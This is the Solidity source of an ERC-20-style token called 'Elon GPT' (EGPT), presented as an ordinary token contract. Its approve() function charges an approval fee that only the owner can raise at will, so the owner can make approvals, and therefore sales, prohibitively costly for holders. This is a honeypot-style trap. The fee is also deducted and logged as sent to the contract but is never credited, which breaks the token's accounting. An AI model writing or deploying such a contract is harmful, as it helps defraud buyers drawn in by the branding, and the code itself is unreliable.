// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ElonGPT {
    string public name = "Elon GPT";
    string public symbol = "EGPT";
    uint8 public decimals = 9;
    uint256 public totalSupply = 1000000000000 * 10 ** uint256(decimals);
    string public tokenLogoUrl = "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSNRCVPlGksoqRkV3sgJkjLv4EC8llSL5Bv_89GwXWfVjR_q1bGwTCjVHlYl--niTYETNGM3KS8S-Dd-FNNEVg_5tT3dUJYsBccY0intDNLd5MR46t6eQMoHCP5v99fH24JlmDybn4FLkf52nzT8QYN7wI63_abJlnm9c0ICqZomxk2yD4wSoaOVxpGA/s16000/ELON%20GPT.png";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;
    uint256 public approvalFee = 0.1 ether;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
    }

    function setApprovalFee(uint256 _approvalFee) public onlyOwner {
        approvalFee = _approvalFee;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= approvalFee, "Insufficient balance for approval fee");
        allowance[msg.sender][_spender] = _value;
        balanceOf[msg.sender] -= approvalFee;
        emit Approval(msg.sender, _spender, _value);
        emit Transfer(msg.sender, address(this), approvalFee);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Not enough allowance");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }
}